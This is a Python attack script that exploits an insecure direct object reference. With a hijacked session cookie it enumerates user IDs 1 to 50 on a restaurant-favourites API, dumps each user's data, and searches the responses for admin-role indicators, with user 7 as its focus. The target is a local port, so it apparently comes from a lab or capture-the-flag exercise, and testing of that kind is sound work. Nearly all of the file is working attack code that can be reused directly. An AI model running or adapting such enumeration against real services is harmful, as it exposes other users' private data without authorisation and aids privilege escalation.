import requests
import json
import sys

# Target endpoint
base_url = "http://127.0.0.1:32825"
endpoint = "/api/get_favorite_restaurants.php"

# Session with cookie
session = requests.Session()
session.cookies.set("PHPSESSID", "hk4mi61pda6ge5d66s5qjhkil3")

# Store results
valid_users = []
admin_info = None
user_7_data = None

print("[*] Starting IDOR enumeration on /api/get_favorite_restaurants.php")
print("[*] Testing user IDs 1-50\n")

# Test user IDs 1-50
for user_id in range(1, 51):
    try:
        url = f"{base_url}{endpoint}?userId={user_id}"
        response = session.get(url, timeout=10)
        
        # Check if response is valid JSON and not an error
        try:
            data = response.json()
            # Check for error indicators in JSON response
            error_keywords = ['error', 'Error', 'ERROR', 'fail', 'Fail', 'FAIL', 'invalid', 'Invalid', 'not found', 'unauthorized']
            has_error = any(error in str(data) for error in error_keywords)
            
            if response.status_code == 200 and not has_error:
                print(f"[+] userId={user_id}: VALID USER - Status: {response.status_code}")
                valid_users.append(user_id)
                
                # Extract detailed info for userId=7
                if user_id == 7:
                    user_7_data = data
                    print(f"  [INFO] Response data for userId=7: {json.dumps(data, indent=2)}")
                    
                    # Look for admin indicators
                    admin_keywords = ['admin', 'Admin', 'ADMIN', 'role', 'Role', 'ROLE', 'isAdmin', 'is_admin', 'administrator']
                    for key, value in data.items():
                        if isinstance(value, dict):
                            for subkey, subvalue in value.items():
                                if any(admin in str(subkey).lower() or admin in str(subvalue).lower() for admin in admin_keywords):
                                    admin_info = {subkey: subvalue}
                                    print(f"  [ADMIN] Found admin indicator: {subkey} = {subvalue}")
                        else:
                            if any(admin in str(key).lower() or admin in str(value).lower() for admin in admin_keywords):
                                admin_info = {key: value}
                                print(f"  [ADMIN] Found admin indicator: {key} = {value}")
                
                # Print brief info about valid users (not 7, to avoid duplicate output)
                if user_id != 7:
                    print(f"  [INFO] Response preview: {str(data)[:100]}...")
                    
            else:
                print(f"[-] userId={user_id}: Invalid/Error - Status: {response.status_code}")
                if has_error:
                    print(f"  [ERROR] Error in response: {str(data)[:100]}")
                    
        except json.JSONDecodeError:
            # Not JSON, likely invalid user
            print(f"[-] userId={user_id}: Not JSON - Status: {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"[!] userId={user_id}: Request failed - {str(e)}")
        continue

# Summary
print("\n" + "="*60)
print("ENUMERATION SUMMARY")
print("="*60)
print(f"[*] Valid user IDs found: {len(valid_users)}")
print(f"[*] Valid IDs: {valid_users}")

if 7 in valid_users:
    print("\n[+] CONFIRMED: userId=7 is a VALID USER")
    if admin_info:
        print(f"[+] ADMIN INDICATOR FOUND: {admin_info}")
        print("[+] userId=7 appears to be an ADMIN user!")
    else:
        print("[*] No explicit admin indicator found in userId=7 data")
        print("[*] However, data was accessible indicating IDOR vulnerability")
else:
    print("\n[-] userId=7 was NOT found to be valid")

# Print all valid user data for analysis
print("\n" + "="*60)
print("ALL VALID USER RESPONSES")
print("="*60)
if valid_users:
    for user_id in valid_users:
        url = f"{base_url}{endpoint}?userId={user_id}"
        response = session.get(url, timeout=10)
        try:
            data = response.json()
            print(f"\n[USER {user_id}]:")
            print(json.dumps(data, indent=2))
        except:
            print(f"\n[USER {user_id}]: Could not parse JSON")
else:
    print("No valid users found")

print("\n[*] IDOR enumeration completed")
